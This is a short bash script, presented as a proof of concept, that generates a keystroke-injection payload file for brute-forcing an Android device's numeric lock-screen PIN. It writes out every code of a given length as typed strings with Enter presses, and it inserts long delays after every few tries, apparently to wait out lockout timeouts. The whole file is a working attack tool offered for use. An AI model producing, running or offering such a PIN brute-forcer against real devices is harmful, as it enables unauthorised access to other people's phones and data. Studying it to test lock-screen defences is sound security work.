#!/bin/bash

: ' 
Version: 0.1
Autor: @codexlynx
Date: 20/12/15
License: GPL 3.0

Description:

  PoC (Proof of Concept) digits Brute Force,
  payload generator. Designed for Android.

'

echo "Digits Brute Force v0.1"
echo ""

if [ "$#" -ne 3 ]; then
  echo "   Usage: $0 <initial delay> <number of digits> <filename>"
else
  echo "   [*]Generating Payload..."
  count=0
  echo "DELAY $1" >> $3
  num1=$(yes 0 | head -$2 | tr -d "\n")
  num2=$(yes 9 | head -$2 | tr -d "\n")

  for num in $(eval echo {$num1..$num2})
  do
    count=$((count + 1))
    echo "STRING $num" >> $3
    if [ $((count % 2)) -eq 0 ]; then
      echo "DELAY 1000" >> $3
      echo "ENTER" >> $3
      echo "ENTER" >> $3
    fi

    if [ $((count % 5)) -eq 0 ]; then
      for (( delay=0 ; $((delay < 4)) ; delay=$((delay + 1)) ))
      do
        echo "DELAY 5000" >> $3
        echo "ENTER" >> $3
      done
    fi
  done
  echo "   [*]Done"

fi

echo ""
echo "Create by: @codexlynx"
